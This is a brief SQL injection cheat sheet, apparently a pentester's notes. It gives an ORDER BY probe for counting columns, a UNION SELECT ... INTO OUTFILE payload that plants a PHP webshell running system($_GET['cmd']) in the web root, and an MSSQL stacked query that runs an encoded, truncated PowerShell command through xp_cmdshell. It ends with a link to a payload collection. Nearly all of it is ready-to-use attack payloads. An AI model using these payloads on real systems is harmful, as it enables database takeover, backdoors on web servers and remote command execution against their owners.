Enumerate no. of columns for `UNION`-based payload:
```sql
' ORDER BY <Column no. to test>-- //
```

Inject webshell into PHP site via `UNION`:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Example stacked query that worked against a machine:
```sql
'; EXECUTE xp_cmdshell 'powershell -enc JABjAGwAaQBl...AKAApAA==';--
```

For examples of the above and more check out PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md